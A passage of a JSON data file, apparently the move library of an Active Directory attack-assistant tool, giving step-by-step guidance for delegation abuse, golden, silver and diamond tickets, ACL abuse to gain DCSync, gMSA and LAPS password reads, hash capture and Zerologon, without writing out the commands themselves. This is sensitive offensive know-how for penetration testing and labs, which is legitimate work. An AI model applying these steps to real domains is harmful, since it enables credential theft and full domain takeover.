    {
      "when": "From a low-privilege Windows foothold when LDAP signing is not enforced and you can relay local authentication to add Shadow Credentials.",
      "land": [
        "Relays local machine authentication to the DC's LDAP service to write msDS-KeyCredentialLink on the local computer object."
      ],
      "look": [
        "Shadow credentials successfully written to the local machine account."
      ],
      "win": "KrbRelayUp writes Shadow Credentials on the host for local privilege escalation to SYSTEM.",
      "mistakes": []
    }
  ],
  "delegation-abuse": [
    {
      "when": "RBCD step 1 (remote).",
      "land": [
        "Create a machine account you control."
      ],
      "look": [
        "A new machine account."
      ],
      "win": "An attacker-controlled computer exists.",
      "mistakes": [
        "MachineAccountQuota is 0. Use an existing account you own."
      ]
    },
    {
      "when": "RBCD step 2.",
      "land": [
        "Give your machine delegation rights over the target, then getST."
      ],
      "look": [
        "A ticket to impersonate on the target."
      ],
      "win": "RBCD is set and a ticket issued.",
      "mistakes": [
        "Forgetting to run getST after setting the right."
      ]
    },
    {
      "when": "The unconstrained branch (on-host).",
      "land": [
        "From a host under your control, capture a TGT."
      ],
      "look": [
        "A captured TGT."
      ],
      "win": "A delegation TGT captured.",
      "mistakes": [
        "No coercion to bring the auth in."
      ]
    },
    {
      "when": "When you want to configure Resource-Based Constrained Delegation (RBCD) over LDAP in one step with bloodyAD.",
      "land": [
        "Writes the attacker computer SID into msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer object."
      ],
      "look": [
        "Confirmation that the RBCD attribute was updated on the target computer."
      ],
      "win": "bloodyAD configures RBCD on the target computer, ready for impacket-getST -impersonate.",
      "mistakes": [
        "Forgetting the trailing $ on the machine account names."
      ]
    }
  ],
  "golden-ticket": [
    {
      "when": "Post-domain-admin: forge a TGT.",
      "land": [
        "-nthash MUST be the krbtgt NT hash (from the DCSync or NTDS dump), never another account."
      ],
      "look": [
        "A forged TGT as any user."
      ],
      "win": "A golden ticket is forged.",
      "mistakes": [
        "Using the wrong NT hash (not krbtgt), which makes an unusable ticket."
      ]
    }
  ],
  "bloodyad-acl": [
    {
      "when": "Begin here: what can your account genuinely write to?",
      "land": [
        "The detailed output is your menu of abusable writes."
      ],
      "look": [
        "Objects you can write."
      ],
      "win": "Your write footprint is mapped.",
      "mistakes": [
        "Acting before reading what you can actually write."
      ]
    },
    {
      "when": "The winning add.",
      "land": [
        "obol fills the highest-value group you can write to."
      ],
      "look": [
        "Membership granted."
      ],
      "win": "You join a powerful group.",
      "mistakes": [
        "Not re-authenticating to pick up the new membership."
      ]
    },
    {
      "when": "Sweep every reasonable group at once.",
      "land": [
        "obol fills the list with the high-value groups to try."
      ],
      "look": [
        "A group that accepts your add."
      ],
      "win": "A group add sticks.",
      "mistakes": [
        "Trying one group when a sweep is cheap."
      ]
    },
    {
      "when": "Right after joining a WriteDACL-over-domain group.",
      "land": [
        "Grant yourself DCSync, then dump."
      ],
      "look": [
        "DCSync rights, then hashes."
      ],
      "win": "DCSync via the ACL path.",
      "mistakes": [
        "Skipping the grant and trying to dump directly."
      ]
    },
    {
      "when": "The Impacket DCSync grant (bloodyAD unavailable).",
      "land": [
        "Writes the replication rights via dacledit."
      ],
      "look": [
        "The grant applied."
      ],
      "win": "DCSync granted with impacket.",
      "mistakes": [
        "Wrong target DN for the grant."
      ]
    },
    {
      "when": "A WriteOwner edge (a different primitive).",
      "land": [
        "Take ownership of an object, then write its DACL."
      ],
      "look": [
        "Ownership taken."
      ],
      "win": "WriteOwner leveraged.",
      "mistakes": [
        "Confusing it with the DCSync path."
      ]
    },
    {
      "when": "Award yourself GenericAll.",
      "land": [
        "Over an object you own or can write the DACL of. From there, do anything."
      ],
      "look": [
        "GenericAll granted."
      ],
      "win": "Full control of the object.",
      "mistakes": [
        "Granting it on the wrong object."
      ]
    },
    {
      "when": "The Impacket FullControl grant.",
      "land": [
        "The impacket option for a general FullControl grant when bloodyAD is unavailable."
      ],
      "look": [
        "FullControl applied."
      ],
      "win": "FullControl via impacket.",
      "mistakes": [
        "Not cleaning up the ACE afterward."
      ]
    },
    {
      "when": "When a high-value target account you control (via GenericAll/GenericWrite) is currently disabled.",
      "land": [
        "Clears the ACCOUNTDISABLE flag on userAccountControl over LDAP so you can authenticate as the account."
      ],
      "look": [
        "Confirmation that ACCOUNTDISABLE was removed from the target account."
      ],
      "win": "The disabled AD account is re-enabled and ready for login.",
      "mistakes": [
        "Resetting a disabled account's password without clearing ACCOUNTDISABLE first (login will fail with STATUS_ACCOUNT_DISABLED)."
      ]
    },
    {
      "when": "When your user belongs to AD Recycle Bin or holds rights to read deleted objects in Active Directory.",
      "land": [
        "Queries the Deleted Objects container for soft-deleted accounts that often carry legacy passwords or description attributes."
      ],
      "look": [
        "Deleted user or admin objects with custom attributes, SIDs, or passwords."
      ],
      "win": "Deleted AD objects and their attributes are enumerated from the Recycle Bin.",
      "mistakes": []
    },
    {
      "when": "When BloodHound shows WriteOwner on a target user or group and you prefer Impacket's owneredit.py.",
      "land": [
        "Sets your user as the owner of {{target_sam}} over LDAP; follow immediately with dacledit to grant FullControl."
      ],
      "look": [
        "Owner SID modified successfully in the owneredit output."
      ],
      "win": "Ownership of the target AD object transfers to your account.",
      "mistakes": [
        "Stopping after owneredit without running dacledit next (ownership alone only grants WriteDACL until you add the ACE)."
      ]
    }
  ],
  "getst-impersonation": [
    {
      "when": "The RBCD or S4U payoff.",
      "land": [
        "A ticket as administrator to the target service. Put the target FQDN in -spn."
      ],
      "look": [
        "A service ticket impersonating admin."
      ],
      "win": "An impersonation ticket issued.",
      "mistakes": [
        "Using an IP instead of the exact FQDN."
      ]
    },
    {
      "when": "The hash form.",
      "land": [
        "For machine accounts, or when NTLM is all you have."
      ],
      "look": [
        "A ticket via the hash."
      ],
      "win": "getST with a hash.",
      "mistakes": [
        "Pasting the LM half too."
      ]
    },
    {
      "when": "Use the ticket.",
      "land": [
        "-k -no-pass. The host MUST be the exact FQDN you forged for."
      ],
      "look": [
        "Access as the impersonated admin."
      ],
      "win": "The forged ticket works.",
      "mistakes": [
        "Targeting the host by IP, which breaks Kerberos."
      ]
    },
    {
      "when": "Protocol transition is disabled (trustedtoauth: False).",
      "land": [
        "Use -self to request an S4U2self ticket impersonating administrator before S4U2proxy."
      ],
      "look": [
        "A service ticket generated via S4U2self fallback."
      ],
      "win": "Administrator service ticket issued without protocol transition.",
      "mistakes": [
        "Omitting -self when delegation is constrained without protocol transition."
      ]
    },
    {
      "when": "You have a forged ccache ticket and need an interactive PowerShell shell.",
      "land": [
        "Set KRB5CCNAME and authenticate via evil-winrm with the -r realm flag."
      ],
      "look": [
        "An interactive WinRM prompt as the impersonated user."
      ],
      "win": "Kerberos WinRM administrative shell session established.",
      "mistakes": [
        "Omitting -r realm or connecting via bare IP without Kerberos name resolution."
      ]
    }
  ],
  "gmsa-read": [
    {
      "when": "First choice from Kali: dump every gMSA NT hash your account is permitted to read in one command.",
      "land": [
        "NetExec queries LDAP (using LDAPS automatically when required) and parses the msDS-ManagedPassword blob into an NT hash."
      ],
      "look": [
        "Account: <gmsa>$ and its 32-hex NTLM hash in the nxc output."
      ],
      "win": "The gMSA NT hash prints and Obol records it as a ready credential.",
      "mistakes": []
    },
    {
      "when": "Check who can read a gMSA password.",
      "land": [
        "List the gMSAs and the allowed principals."
      ],
      "look": [
        "A gMSA you are allowed to read."
      ],
      "win": "A readable gMSA is found.",
      "mistakes": [
        "Not checking the allowed-principals list."
      ]
    },
    {
      "when": "Read it.",
      "land": [
        "If you count as an allowed principal, this returns the password blob. Extract the NT hash."
      ],
      "look": [
        "The gMSA NT hash."
      ],
      "win": "The gMSA password is read.",
      "mistakes": [
        "Expecting it when you are not an allowed principal."
      ]
    },
    {
      "when": "When you know the specific gMSA account name and want to pull its NTLM hash with bloodyAD.",
      "land": [
        "Queries msDS-ManagedPassword for {{gmsa_account}} and prints the decoded NTLM hash."
      ],
      "look": [
        "ntlm: <hash> printed for the gMSA account."
      ],
      "win": "bloodyAD extracts the gMSA NTLM hash over LDAP.",
      "mistakes": []
    }
  ],
  "laps-read": [
    {
      "when": "First choice from Kali: dump the LAPS local administrator password over SMB/LDAP with NetExec's built-in --laps flag.",
      "land": [
        "Queries both legacy LAPS (ms-Mcs-AdmPwd) and Windows LAPS attributes for any computer object your user can read."
      ],
      "look": [
        "LAPS Administrator password printed beside the computer hostname."
      ],
      "win": "The cleartext LAPS local admin password is recovered.",
      "mistakes": []
    },
    {
      "when": "Read LAPS local-admin passwords (nxc).",
      "land": [
        "Dumps every readable LAPS password across all computers in one pass."
      ],
      "look": [
        "Cleartext local-admin passwords."
      ],
      "win": "LAPS passwords recovered.",
      "mistakes": [
        "Not checking which computers you can read."
      ]
    },
    {
      "when": "The PowerShell form.",
      "land": [
        "On a domain-joined host. This is the legacy LAPS attribute; Windows LAPS uses a different one."
      ],
      "look": [
        "A readable LAPS password."
      ],
      "win": "A LAPS password via PowerShell.",
      "mistakes": [
        "Reading the legacy attribute on a Windows-LAPS deployment."
      ]
    },
    {
      "when": "When you want a raw ldapsearch query from Kali to dump ms-MCS-AdmPwd across all computer objects.",
      "land": [
        "Filters for any computer object with a populated ms-MCS-AdmPwd attribute that your account has ReadLAPSPassword rights on."
      ],
      "look": [
        "ms-MCS-AdmPwd: <cleartext-password> under the computer's DN."
      ],
      "win": "ldapsearch prints the cleartext LAPS password.",
      "mistakes": []
    }
  ],
  "ticket-reuse": [
    {
      "when": "Pass-the-ticket from Kali.",
      "land": [
        "Point KRB5CCNAME at a ccache and run any impacket tool with -k."
      ],
      "look": [
        "Access using the ticket."
      ],
      "win": "The ccache ticket works.",
      "mistakes": [
        "Not exporting KRB5CCNAME."
      ]
    },
    {
      "when": "On-host (Windows).",
      "land": [
        "Inject a .kirbi into your current session (Rubeus or mimikatz ptt)."
      ],
      "look": [
        "The ticket in klist."
      ],
      "win": "The ticket is injected.",
      "mistakes": [
        "Injecting into the wrong logon session."
      ]
    },
    {
      "when": "Overpass-the-hash.",
      "land": [
        "NTLM hash to TGT, injected straight in."
      ],
      "look": [
        "A TGT from the hash."
      ],
      "win": "Overpass-the-hash works.",
      "mistakes": [
        "Confusing it with pass-the-hash (this gets a Kerberos TGT)."
      ]
    }
  ],
  "silver-ticket": [
    {
      "when": "Forge a CIFS silver ticket.",
      "land": [
        "As administrator, using the service or computer NT hash. You also need the domain SID."
      ],
      "look": [
        "A forged service ticket."
      ],
      "win": "A silver ticket is forged.",
      "mistakes": [
        "Wrong SID or service hash."
      ]
    },
    {
      "when": "Use it.",
      "land": [
        "-k -no-pass runs as the impersonated admin on that service."
      ],
      "look": [
        "Access to the service as admin."
      ],
      "win": "The silver ticket works.",
      "mistakes": [
        "Targeting a service the ticket was not forged for."
      ]
    }
  ],
  "diamond-ticket": [
    {
      "when": "Request a real TGT, then re-sign it.",
      "land": [
        "Re-sign as administrator with the krbtgt AES key. Stealthier than a golden ticket."
      ],
      "look": [
        "A modified, valid-looking TGT."
      ],
      "win": "A diamond ticket is forged.",
      "mistakes": [
        "Using the RC4 key where AES is expected."
      ]
    },
    {
      "when": "From an on-host Windows session when you hold the krbtgt AES256 key.",
      "land": [
        "Rubeus.exe diamond requests a real TGT via /tgtdeleg, modifies the PAC to RID 500 and Domain Admins (512), and injects it into memory (/ptt)."
      ],
      "look": [
        "[+] Ticket successfully imported! in Rubeus output."
      ],
      "win": "A modified Diamond TGT is active in the current logon session.",
      "mistakes": [
        "Forgetting /ptt or passing the NT hash instead of the AES256 key to /krbkey."
      ]
    }
  ],
  "ad-acl-abuse": [
    {
      "when": "Read the ACEs on an object.",
      "land": [
        "Per ACE, ActiveDirectoryRights and the SID matter most."
      ],
      "look": [
        "A dangerous right held by a SID you control."
      ],
      "win": "An abusable ACE is found.",
      "mistakes": [
        "Skipping the SID-to-name resolution."
      ]
    },
    {
      "when": "Who has full control of this group.",
      "land": [
        "Re-run for ForceChangePassword, WriteDacl and the rest."
      ],
      "look": [
        "The right-holders."
      ],
      "win": "The control set is mapped.",
      "mistakes": [
        "Checking only GenericAll."
      ]
    },
    {
      "when": "Resolve SIDs to names.",
      "land": [
        "Convert the SIDs to readable names in bulk."
      ],
      "look": [
        "The account names behind the SIDs."
      ],
      "win": "SIDs resolved.",
      "mistakes": [
        "Acting on a raw SID without knowing who it is."
      ]
    },
    {
      "when": "Exploit GenericAll on a group.",
      "land": [
        "Add yourself, then confirm membership."
      ],
      "look": [
        "Your account in the group."
      ],
      "win": "GenericAll on a group leveraged.",
      "mistakes": [
        "Not confirming the add stuck."
      ]
    },
    {
      "when": "Exploit ForceChangePassword or GenericAll on a user.",
      "land": [
        "Reset their password with PowerView."
      ],
      "look": [
        "A password you set on the target user."
      ],
      "win": "The user password is reset.",
      "mistakes": [
        "Resetting a closely monitored account noisily."
      ]
    },
    {
      "when": "WriteDACL on the domain.",
      "land": [
        "Grant your account DCSync (for example via Exchange Windows Permissions)."
      ],
      "look": [
        "DCSync, then the dump."
      ],
      "win": "WriteDACL leads to DCSync.",
      "mistakes": [
        "Granting on the wrong object instead of the domain root."
      ]
    },
    {
      "when": "Resetting user password over SAMR RPC when LDAP is blocked.",
      "land": [
        "setuserinfo2 with level 23 resets the target account password over RPC."
      ],
      "look": [
        "result was WERR_OK."
      ],
      "win": "Target password reset over RPC.",
      "mistakes": [
        "Specifying wrong info level or syntax in rpcclient."
      ]
    },
    {
      "when": "You have WriteOwner permission on an Active Directory object.",
      "land": [
        "owneredit writes your account as owner, granting subsequent WriteDacl."
      ],
      "look": [
        "[+] Owner successfully changed."
      ],
      "win": "Object ownership transferred to controlled principal.",
      "mistakes": [
        "Targeting without -dc-ip or skipping DACL grant after taking ownership."
      ]
    },
    {
      "when": "Adding controlled user to an administrative group via SAMR RPC.",
      "land": [
        "net rpc group addmem leverages RPC to add group members directly."
      ],
      "look": [
        "Successfully added user to group."
      ],
      "win": "Administrative group membership granted via RPC.",
      "mistakes": [
        "Using wrong group SAM name or failing to authenticate with valid domain credentials."
      ]
    }
  ],
  "unconstrained-delegation": [
    {
      "when": "On an unconstrained-delegation host you control.",
      "land": [
        "Watch for the DC TGT. Fire a coercion to force the DC to authenticate to you."
      ],
      "look": [
        "The DC$ TGT in the capture."
      ],
      "win": "The DC TGT is captured.",
      "mistakes": [
        "No coercion to bring the DC auth in."
      ]
    },
    {
      "when": "Use the captured ticket.",
      "land": [
        "Load it, then DCSync with it."
      ],
      "look": [
        "The domain dump via the DC ticket."
      ],
      "win": "DCSync via the captured TGT.",
      "mistakes": [
        "Letting the ticket expire before using it."
      ]
    },
    {
      "when": "On a Windows foothold when you want to extract a usable TGT for the current identity without touching LSASS.",
      "land": [
        "Abuses the Kerberos GSS-API delegation trick to request a forwardable TGT for the current user or machine account."
      ],
      "look": [
        "A base64-encoded .kirbi TGT printed by Rubeus."
      ],
      "win": "A usable Kerberos TGT is extracted without elevation or LSASS access.",
      "mistakes": []
    }
  ],
  "powerview-enum": [
    {
      "when": "From a Windows foothold, load PowerView.",
      "land": [
        "In-memory from your HTTP server, or Import-Module the file."
      ],
      "look": [
        "PowerView functions available."
      ],
      "win": "PowerView is loaded.",
      "mistakes": [
        "AV eating it (see the AMSI move)."
      ]
    },
    {
      "when": "Domain fundamentals.",
      "land": [
        "Forest, DCs, and PdcRoleOwner (the DC to query for the freshest data)."
      ],
      "look": [
        "The PDC to target."
      ],
      "win": "You know the domain layout.",
      "mistakes": [
        "Querying a lagging DC instead of the PDC."
      ]
    },
    {
      "when": "User enumeration.",
      "land": [
        "Every user with password age and last logon. Idle accounts are good spray targets."
      ],
      "look": [
        "Never-logged-on or ancient accounts."
      ],
      "win": "A user map with activity.",
      "mistakes": [
        "Ignoring the activity fields that flag stale accounts."
      ]
    },
    {
      "when": "Group enumeration.",
      "land": [
        "Every group, then follow up for members."
      ],
      "look": [
        "Privileged group members."
      ],
      "win": "Groups mapped.",
      "mistakes": [
        "Not expanding nested membership."
      ]
    },
    {
      "when": "Computer enumeration.",
      "land": [
        "Every computer with its OS and build. The oldest OS is usually the easiest mark."
      ],
      "look": [
        "A legacy or unpatched host."
      ],
      "win": "A soft computer target.",
      "mistakes": [
        "Overlooking a decade-old server."
      ]
    },
    {
      "when": "Kerberoast from within.",
      "land": [
        "Service accounts carrying SPNs."
      ],
      "look": [
        "SPN accounts to roast."
      ],
      "win": "Roast targets from on-host.",
      "mistakes": [
        "Re-running remote roasting when you are already inside."
      ]
    },
    {
      "when": "Where you are local admin.",
      "land": [
        "The classic lateral-movement oracle."
      ],
      "look": [
        "Admin-to hosts."
      ],
      "win": "Lateral targets found.",
      "mistakes": [
        "Escalating when you already have admin somewhere."
      ]
    },
    {
      "when": "Who is logged in where.",
      "land": [
        "NetSessionEnum. Note recent Windows restricts this."
      ],
      "look": [
        "A DA session on a host you can reach."
      ],
      "win": "A session-hunt lead.",
      "mistakes": [
        "Expecting it to work on hardened hosts."
      ]
    },
    {
      "when": "Share sweep.",
      "land": [
        "Readable shares across the domain. Mine them for configs and credentials."
      ],
      "look": [
        "Credential-bearing files."
      ],
      "win": "A domain-wide share sweep.",
      "mistakes": [
        "Not grepping the share contents."
      ]
    }
  ],
  "ad-legacy-enum": [
    {
      "when": "Built-in tools from an RDP or desktop session.",
      "land": [
        "Favor RDP over WinRM for interactive enumeration."
      ],
      "look": [
        "A working desktop."
      ],
      "win": "An interactive session for net commands.",
      "mistakes": [
        "Running interactive tools over a non-interactive WinRM."
      ]
    },
    {
      "when": "All domain users.",
      "land": [
        "net user /domain, then per-user detail."
      ],
      "look": [
        "The user list."
      ],
      "win": "Users via the built-in net command.",
      "mistakes": [
        "Missing per-user group membership."
      ]
    },
    {
      "when": "All domain groups.",
      "land": [
        "net group /domain. Quote multiword names."
      ],
      "look": [
        "Group membership."
      ],
      "win": "Groups via net.",
      "mistakes": [
        "Not quoting \"Domain Admins\"."
      ]
    },
    {
      "when": "Password and lockout policy.",
      "land": [
        "MANDATORY reading before any spraying."
      ],
      "look": [
        "The lockout threshold and window."
      ],
      "win": "The policy is known.",
      "mistakes": [
        "Spraying before reading this."
      ]
    },
    {
      "when": "SPNs (setspn).",
      "land": [
        "HTTP/, MSSQLSvc/ and the like are roast targets."
      ],
      "look": [
        "SPN-bearing accounts."
      ],
      "win": "SPNs via the built-in setspn.",
      "mistakes": [
        "Overlooking a custom-service SPN."
      ]
    },
    {
      "when": "The DCs.",
      "land": [
        "Also nltest /domain_trusts for trust relationships."
      ],
      "look": [
        "The DC list and trusts."
      ],
      "win": "DCs and trusts via built-ins.",
      "mistakes": [
        "Forgetting to check trusts."
      ]
    }
  ],
  "ad-psdotnet-enum": [
    {
      "when": "No PowerView: bypass the execution policy first.",
      "land": [
        "-ep bypass so scripts and functions load."
      ],
      "look": [
        "Scripts now load."
      ],
      "win": "The execution policy is bypassed.",
      "mistakes": [
        "Fighting the policy instead of bypassing it."
      ]
    },
    {
      "when": "The domain object.",
      "land": [
        "Forest, DCs and PdcRoleOwner via .NET."
      ],
      "look": [
        "The PDC with the freshest data."
      ],
      "win": "Domain info with no imports.",
      "mistakes": [
        "Assuming you need a module for this."
      ]
    },
    {
      "when": "The domain DN.",
      "land": [
        "A one-liner for DC=corp,DC=com. No imports required."
      ],
      "look": [
        "The base DN."
      ],
      "win": "The DN for LDAP queries.",
      "mistakes": [
        "Typing the DN by hand and getting it wrong."
      ]
    },
    {
      "when": "The reusable LDAP function.",
      "land": [
        "Paste the whole line, or save it and Import it."
      ],
      "look": [
        "A LDAPSearch function ready."
      ],
      "win": "A reusable query function.",
      "mistakes": [
        "Pasting only part of the function."
      ]
    },
    {
      "when": "Every user object.",
      "land": [
        "805306368 is the user account type. Append .properties.samaccountname."
      ],
      "look": [
        "The user list via raw LDAP."
      ],
      "win": "Users without PowerView.",
      "mistakes": [
        "Using the wrong account-type number."
      ]
    },
    {
      "when": "Every group.",
      "land": [
        "Filter objectCategory=group for membership."
      ],
      "look": [
        "Group membership."
      ],
      "win": "Groups via raw LDAP.",
      "mistakes": [
        "A malformed LDAP filter."
      ]
    },
    {
      "when": "SPN-bearing users.",
      "land": [
        "Kerberoast targets located without PowerView."
      ],
      "look": [
        "SPN accounts."
      ],
      "win": "Roast targets via .NET.",
      "mistakes": [
        "Overlooking that raw LDAP finds SPNs too."
      ]
    }
  ],
  "kerberos-tickets": [
    {
      "when": "ALWAYS first: sync your clock to the DC.",
      "land": [
        "KDC_ERR_SKEW is the top silent killer in AD labs."
      ],
      "look": [
        "The skew error gone after syncing."
      ],
      "win": "The clock matches the DC.",
      "mistakes": [
        "Ignoring clock skew and blaming the credential."
      ]
    },
    {
      "when": "Password to ticket.",
      "land": [
        "Turn a plaintext password into a ccache."
      ],
      "look": [
        "A ccache written."
      ],
      "win": "A TGT from the password.",
      "mistakes": [
        "Not pointing KRB5CCNAME at it afterward."
      ]
    },
    {
      "when": "The hash form.",
      "land": [
        "The same ticket without needing a password."
      ],
      "look": [
        "A ccache from the hash."
      ],
      "win": "A TGT from the hash.",
      "mistakes": [
        "Pasting the LM half too."
      ]
    },
    {
      "when": "Use the ticket.",
      "land": [
        "Point KRB5CCNAME at it, confirm with klist, then every impacket tool takes -k."
      ],
      "look": [
        "klist shows the ticket."
      ],
      "win": "The ticket is usable.",
      "mistakes": [
        "Not exporting KRB5CCNAME."
      ]
    },
    {
      "when": "The MIT-tools option.",
      "land": [
        "kinit asks for the password. Keytabs are supported too."
      ],
      "look": [
        "A ticket via kinit."
      ],
      "win": "A TGT via MIT kinit.",
      "mistakes": [
        "Mixing MIT and impacket ccache formats carelessly."
      ]
    }
  ],
  "kerberos-spn-fix": [
    {
      "when": "Kerberos needs the NAME, never the IP.",
      "land": [
        "Put the DC FQDN in /etc/hosts and address it by name."
      ],
      "look": [
        "The error gone once you use the FQDN."
      ],
      "win": "Kerberos resolves the name.",
      "mistakes": [
        "Using the IP with Kerberos."
      ]
    },
    {
      "when": "S_PRINCIPAL_UNKNOWN on a service ticket.",
      "land": [
        "A wrong or absent SPN. Re-list the SPNs and copy the exact one."
      ],
      "look": [
        "The correct SPN string."
      ],
      "win": "The right SPN makes it work.",
      "mistakes": [
        "Guessing the SPN format."
      ]
    }
  ],
  "relay-target-signing": [
    {
      "when": "The relay is blocked by SMB signing.",
      "land": [
        "Sweep the subnet and write every host with signing OFF to a file."
      ],
      "look": [
        "The signing-off hosts."
      ],
      "win": "A relay target list is built.",
      "mistakes": [
        "Relaying to a signing-required host."
      ]
    },
    {
      "when": "Point the relay at the list.",
      "land": [
        "Target the signing-off hosts, not the signing-required one."
      ],
      "look": [
        "The relay landing on a valid target."
      ],
      "win": "The relay has a valid target.",
      "mistakes": [
        "Keeping the old single-target that required signing."
      ]
    }
  ],
  "responder-tune": [
    {
      "when": "Responder is catching nothing.",
      "land": [
        "Check nothing else holds 445 or 80 (stop a running smbd or apache2) and that SMB and HTTP are On in the conf."
      ],
      "look": [
        "Responder servers actually bound."
      ],
      "win": "Responder is set up to capture.",
      "mistakes": [
        "A running smbd stealing port 445."
      ]
    },
    {
      "when": "Run with the capture servers on.",
      "land": [
        "-w enables WPAD. Hashes land as victims authenticate."
      ],
      "look": [
        "Captured NetNTLMv2 hashes."
      ],
      "win": "Captures start flowing.",
      "mistakes": [
        "Leaving SMB or HTTP off in the config."
      ]
    }
  ],
  "fix-acl-reauth": [
    {
      "when": "The grant was denied: confirm the membership first.",
      "land": [
        "The memberOf list should show the group you just joined."
      ],
      "look": [
        "The group you added yourself to is listed."
      ],
      "win": "The add stuck, so the problem is a stale session token.",
      "mistakes": [
        "Assuming the add failed when it worked, the token is just old."
      ]
    },
    {
      "when": "A cached ticket carries your OLD groups.",
      "land": [
        "Clear it so the next command authenticates fresh."
      ],
      "look": [
        "No ticket cache remains."
      ],
      "win": "The next auth will carry the new membership.",
      "mistakes": [
        "Retrying with the same stale TGT, it will never pick up the new group."
      ]
    },
    {
      "when": "Retry the grant on a fresh authentication.",
      "land": [
        "The DS-Replication ACEs are written now that the membership is in the token."
      ],
      "look": [
        "The grant succeeds (no insufficientAccessRights)."
      ],
      "win": "You hold DCSync, run the dump next.",
      "mistakes": [
        "Re-running without clearing the old ticket first."
      ]
    },
    {
      "when": "Still denied: wait, or get a fresh Kerberos ticket.",
      "land": [
        "Token and replication can lag a few seconds, wait and retry."
      ],
      "look": [
        "The grant lands after a short wait."
      ],
      "win": "The right finally takes effect.",
      "mistakes": [
        "Over Kerberos, reusing the pre-add TGT, get a fresh one after the group add."
      ]
    }
  ],
  "fix-clock-skew": [
    {
      "when": "KDC_ERR_SKEW: sync your clock to the DC.",
      "land": [
        "Sync, then immediately re-run the failing command."
      ],
      "look": [
        "The command succeeds after syncing."
      ],
      "win": "The skew is gone.",
      "mistakes": [
        "Waiting instead of re-running immediately after the sync."
      ]
    },
    {
      "when": "When ntpdate is not installed.",
      "land": [
        "rdate -n does the same over TCP."
      ],
      "look": [
        "The clock synced."
      ],
      "win": "The clock matches via rdate.",
      "mistakes": [
        "Giving up because ntpdate is missing."
      ]
    },
    {
      "when": "If you must not change the host clock.",
      "land": [
        "Wrap just the one command with a faketime offset."
      ],
      "look": [
        "That command succeeds without touching the system clock."
      ],
      "win": "A per-command time fix.",
      "mistakes": [
        "Changing the whole system clock when one command is all that needs it."
      ]
    }
  ],
  "account-password-change": [
    {
      "when": "An expired password you still want to use.",
      "land": [
        "Prompts for the old (expired) and new password over SMB. No admin needed."
      ],
      "look": [
        "The password changed."
      ],
      "win": "The account is usable with the new password.",
      "mistakes": [
        "Assuming an expired password is a dead end."
      ]
    },
    {
      "when": "The impacket form.",
      "land": [
        "Supports -p rpc-samr or -p kpasswd when SMB is filtered."
      ],
      "look": [
        "The change applied."
      ],
      "win": "A changed password via impacket.",
      "mistakes": [
        "Not switching protocol when SMB is blocked."
      ]
    },
    {
      "when": "The rpcclient fallback.",
      "land": [
        "When the above are blocked."
      ],
      "look": [
        "The change applied."
      ],
      "win": "A changed password via rpcclient.",
      "mistakes": [
        "Giving up after the first tool fails."
      ]
    }
  ],
  "ntlm-disabled-kerberos": [
    {
      "when": "NTLM is disabled: switch to Kerberos.",
      "land": [
        "Add -k and use the DC FQDN (put it in /etc/hosts first)."
      ],
      "look": [
        "The login succeeding over Kerberos."
      ],
      "win": "Kerberos auth works where NTLM is off.",
      "mistakes": [
        "Using the IP, which Kerberos rejects."
      ]
    },
    {
      "when": "Reuse a ticket.",
      "land": [
        "Grab a TGT once, then -k -no-pass across the impacket suite."
      ],
      "look": [
        "Tools accepting the ccache."
      ],
      "win": "One TGT reused everywhere.",
      "mistakes": [
        "Re-authenticating for every tool."
      ]
    }
  ],
  "auth-account-blocked": [
    {
      "when": "LOCKOUT (no credentials yet or checking via null session).",
      "land": [
        "Query the domain password and lockout policy anonymously over SMB to inspect the lockout threshold and reset window."
      ],
      "look": [
        "Account Lockout Threshold and Locked Accountael/Observation Window values."
      ],
      "win": "You know the lockout window without needing a working login first.",
      "mistakes": [
        "Continuing to spray while waiting for the observation window to expire."
      ]
    },
    {
      "when": "LOCKOUT (with a working domain credential).",
      "land": [
        "Read the lockout policy (threshold and window). Stop spraying and wait out the window."
      ],
      "look": [
        "The observation window to wait."
      ],
      "win": "You stop before locking more accounts.",
      "mistakes": [
        "Continuing to spray and locking the domain."
      ]
    },
    {
      "when": "RESTRICTED.",
      "land": [
        "The account may be disabled (UAC flag 2), expired, or denied this logon type. Try a different logon (WinRM vs SMB)."
      ],
      "look": [
        "Which restriction applies."
      ],
      "win": "You identify why the account is blocked.",
      "mistakes": [
        "Assuming the password is wrong when the account is simply disabled."
      ]
    }
  ],
  "trust-enum": [
    {
      "when": "From a domain-joined foothold.",
      "land": [
        "The quick way to list the trusts."
      ],
      "look": [
        "Trust names and directions."
      ],
      "win": "Trusts enumerated.",
      "mistakes": [
        "Ignoring the trust direction."
      ]
    },
    {
      "when": "PowerView, with attributes.",
      "land": [
        "Trusts plus their attributes. BloodHound Map Domain Trusts visualizes it."
      ],
      "look": [
        "Trust direction and type."
      ],
      "win": "Trusts with detail.",
      "mistakes": [
        "Overlooking a bidirectional trust."
      ]
    },
    {
      "when": "Enumerate users across a trust.",
      "land": [
        "SID enumeration against the trusted domain."
      ],
      "look": [
        "Users in the trusted domain."
      ],
      "win": "Cross-trust users listed.",
      "mistakes": [
        "Assuming the trust is one-way without checking."
      ]
    },
    {
      "when": "Rapid automated domain trust enumeration over SMB.",
      "land": [
        "nxc enum_trusts module queries LSA and Active Directory trust relationships."
      ],
      "look": [
        "List of trusted partner domains, trust direction, and trust type."
      ],
      "win": "Complete cross-domain trust topology enumerated in single command.",
      "mistakes": [
        "Omitting domain name or running against non-DC without trust authority."
      ]
    }
  ],
  "zerologon-check": [
    {
      "when": "Check for Zerologon, safely.",
      "land": [
        "The nxc zerologon module is a safe, unauthenticated detection."
      ],
      "look": [
        "A VULNERABLE verdict."
      ],
      "win": "Zerologon status is known.",
      "mistakes": [
        "Running the exploit just to \"check\"."
      ]
    },
    {
      "when": "A standalone detector.",
      "land": [
        "Equally safe. It verifies WITHOUT altering anything."
      ],
      "look": [
        "The verdict."
      ],
      "win": "A safe second opinion.",
      "mistakes": [
        "Confusing the detector with the exploit."
      ]
    }
  ],
  "zerologon-exploit": [
    {
      "when": "The self-restoring one-shot (autopwn).",
      "land": [
        "Empties the DC machine password, dumps, and restores in one path. Still verify the restore."
      ],
      "look": [
        "The domain dumped, then restored."
      ],
      "win": "Zerologon dumps and restores.",
      "mistakes": [
        "Trusting autopwn without confirming the restore."
      ]
    },
    {
      "when": "Step 1 (manual): empty the DC machine password.",
      "land": [
        "The domain is now BROKEN until you restore it. This is destructive."
      ],
      "look": [
        "The password set to empty."
      ],
      "win": "The DC account is reset (temporarily).",
      "mistakes": [
        "Forgetting this breaks the DC until restored."
      ]
    },
    {
